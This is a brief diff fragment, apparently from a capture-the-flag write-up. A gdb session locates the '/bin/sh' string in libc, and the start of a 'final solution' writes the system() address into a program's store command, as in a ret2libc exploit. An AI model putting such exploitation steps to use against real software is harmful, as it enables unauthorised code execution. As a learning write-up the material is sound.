@@ -107,6 +107,8 @@ libc-2.15.so : 0xf7e2c000
 (gdb) x/s 0xf7f897ec
 0xf7f897ec:      "/bin/sh"
 
+##########final solution ############################
+
 #put index
 Input command: store
  Number: 4159090384 #system address
